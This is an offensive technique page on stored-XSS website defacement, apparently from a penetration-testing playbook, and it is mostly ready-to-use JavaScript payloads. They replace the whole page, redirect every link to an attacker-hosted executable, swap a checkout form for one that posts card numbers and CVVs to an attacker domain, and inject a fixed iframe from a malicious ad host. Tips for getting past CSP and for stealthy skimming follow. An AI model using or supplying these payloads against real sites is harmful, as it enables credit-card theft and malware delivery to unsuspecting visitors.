# XSS — Website Defacement

## When this applies

A persistent (stored) XSS sink that all visitors render. Defacement is high-impact for proof-of-concept (visible takeover), brand damage demonstration, or as an enabler for downstream attacks (replacing payment forms, hijacking links, injecting malicious ads).

## Technique

JavaScript replaces the page DOM with attacker content. Three sub-patterns:
1. **Full overwrite** — `document.body.innerHTML = …` for visible takeover.
2. **Subtle manipulation** — rewrite all `<a href>` links, replace specific forms (payment, login).
3. **Ad injection** — append a fixed-position iframe loading attacker content.

## Steps

### Complete Page Replacement

```javascript
<script>
// Full page defacement
document.body.innerHTML = `
    <div style="text-align:center; padding-top:100px; font-size:48px; color:red;">
        <h1>Site Compromised</h1>
        <p>This site has been hacked by [Attacker Name]</p>
        <p>All your data belongs to us!</p>
    </div>
`;
</script>
```

### Subtle Content Manipulation

**Link Hijacking**:
```javascript
<script>
// Replace all links with malicious URLs
document.querySelectorAll('a').forEach(function(link) {
    link.href = 'https://attacker.com/malware.exe';
});
</script>
```

**Payment Form Replacement**:
```javascript
<script>
if(location.pathname.includes('checkout')) {
    // Replace payment form
    var paymentForm = document.querySelector('.payment-form');
    if(paymentForm) {
        paymentForm.innerHTML = `
            <form action="https://attacker.com/steal-cc" method="POST">
                <input name="cardnumber" placeholder="Card Number" required>
                <input name="expiry" placeholder="MM/YY" required>
                <input name="cvv" placeholder="CVV" required>
                <button>Process Payment</button>
            </form>
        `;
    }
}
</script>
```

### Ad Injection

```javascript
<script>
// Inject malicious ads
var ad = document.createElement('div');
ad.innerHTML = '<iframe src="https://malicious-ads.com/serve" width="100%" height="250"></iframe>';
ad.style.cssText = 'position:fixed; bottom:0; left:0; width:100%; z-index:10000;';
document.body.appendChild(ad);
</script>
```

## Verifying success

- Page renders attacker content for any visitor (test in fresh incognito window with no auth).
- For link hijacking: `document.querySelectorAll('a')[0].href` returns attacker URL in DevTools console.
- For payment-form replacement: form `action` attribute now points to attacker domain — verify with View Source after page load.
- For ad injection: iframe is visible and loads attacker content even on pages where it shouldn't appear.

## Common pitfalls

1. **Running defacement before DOM is ready** — `document.body` is null in the `<head>`; wrap with `DOMContentLoaded` if injecting in a script tag that loads early.
2. **CSP `style-src 'self'`** — inline styles in defacement payload are blocked; use `<style>` tags or pre-existing CSS classes.
3. **Modifying SPA-managed DOM** — React/Vue/Angular re-render and overwrite your changes; hook into the framework or replace at the root.
4. **Visible defacement triggers detection** — full takeover is loud. For stealth (payment skimmer), prefer minimal modification.

## Tools

- **DevTools Elements panel** — verify DOM modifications applied
- **View Source** vs. **Inspect** — distinguish server HTML from JavaScript-modified DOM
- **Browser headless mode (Puppeteer / Playwright)** — automate visiting deface PoC and screenshotting evidence
